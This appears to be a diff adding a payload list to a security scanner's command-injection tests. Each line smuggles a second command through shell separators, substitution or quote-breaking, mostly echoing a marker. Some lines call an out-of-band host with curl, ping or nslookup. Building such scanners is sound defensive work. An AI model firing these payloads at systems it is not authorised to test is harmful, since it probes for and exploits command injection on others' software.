@@ -1,0 +1,13 @@
+# Command injection markers — each payload echoes a unique marker so detection is unambiguous.
+;echo SX_{TOKEN}_OK;
+|echo SX_{TOKEN}_OK
+`echo SX_{TOKEN}_OK`
+$(echo SX_{TOKEN}_OK)
+&& echo SX_{TOKEN}_OK
+%0Aecho%20SX_{TOKEN}_OK
+;curl http://oob.{TOKEN}.samaritanx.local
+;ping -c 1 oob.{TOKEN}.samaritanx.local
+| nslookup oob.{TOKEN}.samaritanx.local
+$(printf "SX_{TOKEN}_OK")
+';echo SX_{TOKEN}_OK;'
+"); echo SX_{TOKEN}_OK; ("
